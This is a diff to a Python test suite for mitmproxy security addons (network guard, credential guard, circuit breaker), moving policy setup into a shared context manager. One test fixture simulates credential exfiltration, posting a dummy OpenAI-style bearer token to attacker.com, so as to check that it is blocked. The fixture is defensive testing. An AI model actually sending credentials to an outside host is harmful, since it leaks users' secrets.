@@ -5,6 +5,39 @@ Tests that addons work together correctly via flow.metadata sharing.
 """
 
 import threading
+from contextlib import contextmanager
+
+from pdp import PolicyClientConfig, get_policy_client, reset_policy_client
+
+
+@contextmanager
+def policy_context(tmp_path, policy_yaml: str):
+    """Context manager for setting up PDP with a test policy.
+
+    Usage:
+        with policy_context(tmp_path, '''
+        metadata:
+          version: "1.0"
+        permissions:
+          - action: network:request
+            resource: "*"
+            effect: allow
+        '''):
+            # Test code using the policy
+            pass
+    """
+    reset_policy_client()
+
+    baseline = tmp_path / "baseline.yaml"
+    baseline.write_text(policy_yaml)
+
+    config = PolicyClientConfig(baseline_path=baseline)
+    get_policy_client(config)
+
+    try:
+        yield
+    finally:
+        reset_policy_client()
 
 
 class TestFullAddonChain:
@@ -12,20 +45,13 @@ class TestFullAddonChain:
 
     def test_request_flows_through_all_addons(self, make_flow, make_response, tmp_path):
         """Test a request is processed by all active addons."""
-        import policy_engine as pe
         from credential_guard import DEFAULT_RULES, CredentialGuard
         from metrics import MetricsCollector
         from mitmproxy.test import taddons
         from network_guard import NetworkGuard
-        from policy_engine import init_policy_engine
         from request_id import RequestIdGenerator
 
-        # Save and restore engine
-        old_engine = pe._policy_engine
-
-        # Create permissive baseline
-        baseline = tmp_path / "baseline.yaml"
-        baseline.write_text("""
+        policy_yaml = """
 metadata:
   version: "1.0"
 permissions:
@@ -41,10 +67,8 @@ budgets: {}
 required: []
 addons: {}
 domains: {}
-""")
-        init_policy_engine(baseline_path=baseline)
-
-        try:
+"""
+        with policy_context(tmp_path, policy_yaml):
             # Create addon instances
             rid = RequestIdGenerator()
             ng = NetworkGuard()
@@ -85,23 +109,15 @@ domains: {}
 
                 assert metrics.requests_total == 1
                 assert metrics.requests_success == 1
-        finally:
-            pe._policy_engine = old_engine
 
     def test_blocked_request_stops_chain(self, make_flow, tmp_path):
         """Test that blocked request doesn't reach downstream addons."""
-        import policy_engine as pe
         from credential_guard import CredentialGuard
         from metrics import MetricsCollector
         from mitmproxy.test import taddons
         from network_guard import NetworkGuard
-        from policy_engine import init_policy_engine
 
-        old_engine = pe._policy_engine
-
-        # Create baseline that blocks evil.com
-        baseline = tmp_path / "baseline.yaml"
-        baseline.write_text("""
+        policy_yaml = """
 metadata:
   version: "1.0"
 permissions:
@@ -112,10 +128,8 @@ budgets: {}
 required: []
 addons: {}
 domains: {}
-""")
-        init_policy_engine(baseline_path=baseline)
-
-        try:
+"""
+        with policy_context(tmp_path, policy_yaml):
             ng = NetworkGuard()
             cg = CredentialGuard()
             metrics = MetricsCollector()
@@ -135,21 +149,14 @@ domains: {}
                 # Metrics tracks the block
                 metrics.response(flow)
                 assert metrics.requests_blocked == 1
-        finally:
-            pe._policy_engine = old_engine
 
     def test_concurrent_requests_thread_safe(self, make_flow, make_response, tmp_path):
         """Test multiple simultaneous requests don't corrupt state."""
-        import policy_engine as pe
         from metrics import MetricsCollector
         from mitmproxy.test import taddons
         from network_guard import NetworkGuard
-        from policy_engine import init_policy_engine
 
-        old_engine = pe._policy_engine
-
-        baseline = tmp_path / "baseline.yaml"
-        baseline.write_text("""
+        policy_yaml = """
 metadata:
   version: "1.0"
 permissions:
@@ -160,10 +167,8 @@ budgets: {}
 required: []
 addons: {}
 domains: {}
-""")
-        init_policy_engine(baseline_path=baseline)
-
-        try:
+"""
+        with policy_context(tmp_path, policy_yaml):
             metrics = MetricsCollector()
             ng = NetworkGuard()
             results = []
@@ -192,20 +197,14 @@ domains: {}
             assert len(results) == 10
             assert metrics.requests_total == 10
             assert metrics.requests_success == 10
-        finally:
-            pe._policy_engine = old_engine
 
     def test_policy_reload_during_request(self, make_flow, tmp_path):
         """Test policy reload doesn't break in-flight requests."""
-        import policy_engine as pe
         from mitmproxy.test import taddons
         from network_guard import NetworkGuard
-        from policy_engine import get_policy_engine, init_policy_engine
+        from pdp import get_policy_client
 
-        old_engine = pe._policy_engine
-
-        baseline = tmp_path / "baseline.yaml"
-        baseline.write_text("""
+        policy_yaml = """
 metadata:
   version: "1.0"
 permissions:
@@ -216,25 +215,21 @@ budgets: {}
 required: []
 addons: {}
 domains: {}
-""")
-        init_policy_engine(baseline_path=baseline)
-
-        try:
+"""
+        with policy_context(tmp_path, policy_yaml):
             ng = NetworkGuard()
-            engine = get_policy_engine()
+            client = get_policy_client()
 
             # Start a request
             flow = make_flow(url="https://api.example.com/test")
 
             with taddons.context(ng):
-                # Trigger policy reload mid-request
-                engine._loader.reload()
+                # Trigger policy reload mid-request (via PDPCore's internal engine)
+                client._pdp._engine._loader.reload()
 
                 # Request should still work
                 ng.request(flow)
                 assert flow.response is None  # Allowed
-        finally:
-            pe._policy_engine = old_engine
 
 
 class TestAddonChainMetadata:
@@ -253,17 +248,11 @@ class TestAddonChainMetadata:
         assert flow.metadata.get("blocked_by") == "credential-guard"
         assert flow.metadata.get("credential_fingerprint") is not None
 
-    def test_network_guard_sets_blocked_by(self, network_guard, make_flow, tmp_path):
+    def test_network_guard_sets_blocked_by(self, make_flow, tmp_path):
         """Test that network_guard sets blocked_by metadata when rate limited."""
-        import policy_engine as pe
-        from policy_engine import init_policy_engine
+        from network_guard import NetworkGuard
 
-        # Save and restore engine
-        old_engine = pe._policy_engine
-
-        # Create baseline with low budget for test.com
-        baseline = tmp_path / "baseline.yaml"
-        baseline.write_text("""
+        policy_yaml = """
 metadata:
   version: "1.0"
 permissions:
@@ -275,23 +264,22 @@ budgets: {}
 required: []
 addons: {}
 domains: {}
-""")
-        init_policy_engine(baseline_path=baseline)
+"""
+        with policy_context(tmp_path, policy_yaml):
+            ng = NetworkGuard()
+            ng.should_block = lambda: True
 
-        try:
             # Exhaust budget (2 requests allowed)
             flow1 = make_flow(url="http://test.com/api")
-            network_guard.request(flow1)
+            ng.request(flow1)
             flow2 = make_flow(url="http://test.com/api")
-            network_guard.request(flow2)
+            ng.request(flow2)
 
             # Get blocked on 3rd
             flow3 = make_flow(url="http://test.com/api")
-            network_guard.request(flow3)
+            ng.request(flow3)
 
             assert flow3.metadata.get("blocked_by") == "network-guard"
-        finally:
-            pe._policy_engine = old_engine
 
     def test_circuit_breaker_sets_blocked_by(self, circuit_breaker, make_flow):
         """Test that circuit_breaker sets blocked_by metadata."""
@@ -318,17 +306,11 @@ domains: {}
 class TestAddonChainOrder:
     """Tests for addon execution order semantics."""
 
-    def test_first_blocker_wins(self, credential_guard, network_guard, make_flow, tmp_path):
+    def test_first_blocker_wins(self, credential_guard, make_flow, tmp_path):
         """Test that first addon to block sets response."""
-        import policy_engine as pe
-        from policy_engine import init_policy_engine
+        from network_guard import NetworkGuard
 
-        # Save and restore engine
-        old_engine = pe._policy_engine
-
-        # Create baseline with low budget for evil.com
-        baseline = tmp_path / "baseline.yaml"
-        baseline.write_text("""
+        policy_yaml = """
 metadata:
   version: "1.0"
 permissions:
@@ -340,15 +322,16 @@ budgets: {}
 required: []
 addons: {}
 domains: {}
-""")
-        init_policy_engine(baseline_path=baseline)
+"""
+        with policy_context(tmp_path, policy_yaml):
+            ng = NetworkGuard()
+            ng.should_block = lambda: True
 
-        try:
             # Exhaust rate limit (2 requests allowed)
             flow1 = make_flow(url="http://evil.com/api")
-            network_guard.request(flow1)
+            ng.request(flow1)
             flow2 = make_flow(url="http://evil.com/api")
-            network_guard.request(flow2)
+            ng.request(flow2)
 
             # Create flow that would be blocked by both addons
             flow = make_flow(
@@ -358,57 +341,116 @@ domains: {}
             )
 
             # If network_guard runs first (as in production chain)
-            network_guard.request(flow)
+            ng.request(flow)
             assert flow.response is not None
             assert flow.metadata.get("blocked_by") == "network-guard"
-        finally:
-            pe._policy_engine = old_engine
 
 
 class TestRealisticScenarios:
     """Tests for realistic usage scenarios."""
 
-    def test_openai_request_through_chain(self, credential_guard, network_guard, circuit_breaker, make_flow, make_response):
+    def test_openai_request_through_chain(self, circuit_breaker, make_flow, make_response, tmp_path):
         """Test a realistic OpenAI API request through the chain."""
-        flow = make_flow(
-            method="POST",
-            url="https://api.openai.com/v1/chat/completions",
-            headers={
-                "Authorization": f"Bearer sk-proj-{'a' * 80}",
-                "Content-Type": "application/json",
-            },
-        )
+        from credential_guard import DEFAULT_RULES, CredentialGuard
+        from mitmproxy.test import taddons
+        from network_guard import NetworkGuard
 
-        # Run through addons (in production order)
-        network_guard.request(flow)
-        assert flow.response is None, "Should pass network guard"
+        policy_yaml = """
+metadata:
+  version: "1.0"
+permissions:
+  - action: network:request
+    resource: "*"
+    effect: allow
+  - action: credential:use
+    resource: "api.openai.com/*"
+    effect: allow
+    condition:
+      credential: ["openai:*"]
+budgets: {}
+required: []
+addons: {}
+domains: {}
+"""
+        with policy_context(tmp_path, policy_yaml):
+            ng = NetworkGuard()
+            ng.should_block = lambda: True
 
-        circuit_breaker.request(flow)
-        assert flow.response is None, "Should pass circuit breaker"
+            cg = CredentialGuard()
+            cg.rules = list(DEFAULT_RULES)
+            cg.hmac_secret = b"test-secret"
+            cg.config = {}
+            cg.safe_headers_config = {}
 
-        credential_guard.request(flow)
-        assert flow.response is None, "Should pass credential guard (correct host)"
+            flow = make_flow(
+                method="POST",
+                url="https://api.openai.com/v1/chat/completions",
+                headers={
+                    "Authorization": f"Bearer sk-proj-{'a' * 80}",
+                    "Content-Type": "application/json",
+                },
+            )
 
-        # Simulate success response
-        flow.response = make_response(status_code=200)
-        circuit_breaker.response(flow)
+            with taddons.context(ng, cg):
+                # Run through addons (in production order)
+                ng.request(flow)
+                assert flow.response is None, "Should pass network guard"
 
-        status = circuit_breaker.get_status("api.openai.com")
-        assert status.failure_count == 0
+                circuit_breaker.request(flow)
+                assert flow.response is None, "Should pass circuit breaker"
 
-    def test_exfiltration_attempt_blocked(self, credential_guard, make_flow):
+                cg.request(flow)
+                assert flow.response is None, "Should pass credential guard (correct host)"
+
+                # Simulate success response
+                flow.response = make_response(status_code=200)
+                circuit_breaker.response(flow)
+
+                status = circuit_breaker.get_status("api.openai.com")
+                assert status.failure_count == 0
+
+    def test_exfiltration_attempt_blocked(self, make_flow, tmp_path):
         """Test that credential exfiltration to wrong host is blocked."""
-        flow = make_flow(
-            method="POST",
-            url="https://attacker.com/log",
-            headers={"Authorization": f"Bearer sk-proj-{'a' * 80}"},
-        )
+        from credential_guard import DEFAULT_RULES, CredentialGuard
+        from mitmproxy.test import taddons
 
-        credential_guard.request(flow)
+        policy_yaml = """
+metadata:
+  version: "1.0"
+permissions:
+  - action: credential:use
+    resource: "api.openai.com/*"
+    effect: allow
+    condition:
+      credential: ["openai:*"]
+  - action: credential:use
+    resource: "*"
+    effect: prompt
+budgets: {}
+required: []
+addons: {}
+domains: {}
+"""
+        with policy_context(tmp_path, policy_yaml):
+            cg = CredentialGuard()
+            cg.rules = list(DEFAULT_RULES)
+            cg.hmac_secret = b"test-secret"
+            cg.config = {}
+            cg.safe_headers_config = {}
 
-        assert flow.response is not None
-        assert flow.response.status_code == 428
-        assert b"credential" in flow.response.content.lower()
+            flow = make_flow(
+                method="POST",
+                url="https://attacker.com/log",
+                headers={"Authorization": f"Bearer sk-proj-{'a' * 80}"},
+            )
+
+            with taddons.context(cg):
+                cg.request(flow)
+
+            assert flow.response is not None
+            assert flow.response.status_code == 428
+            # Response now says "require approval" not "credential"
+            assert b"approval" in flow.response.content.lower()
 
     def test_circuit_opens_on_upstream_failures(self, circuit_breaker, make_flow, make_response):
         """Test circuit opens after upstream service fails repeatedly."""
@@ -476,17 +518,10 @@ class TestBlockingMode:
 
     def test_credential_guard_warn_mode_passes_request(self, make_flow, tmp_path):
         """Test credential_guard in warn mode allows request through."""
-        import policy_engine as pe
         from credential_guard import DEFAULT_RULES, CredentialGuard
         from mitmproxy.test import taddons
-        from policy_engine import init_policy_engine
 
-        # Save and restore engine
-        old_engine = pe._policy_engine
-
-        # Create minimal baseline for test
-        baseline = tmp_path / "baseline.yaml"
-        baseline.write_text("""
+        policy_yaml = """
 metadata:
   version: "1.0"
 permissions:
@@ -497,10 +532,8 @@ budgets: {}
 required: []
 addons: {}
 domains: {}
-""")
-        init_policy_engine(baseline_path=baseline)
-
-        try:
+"""
+        with policy_context(tmp_path, policy_yaml):
             guard = CredentialGuard()
             guard.rules = list(DEFAULT_RULES)
             guard.hmac_secret = b"test-secret"
@@ -521,8 +554,6 @@ domains: {}
                 # Warn-only: no response set, request continues
                 assert flow.response is None
                 assert guard.violations_total == 1
-        finally:
-            pe._policy_engine = old_engine
 
     def test_default_is_block_mode(self):
         """Test that default behavior is block mode."""
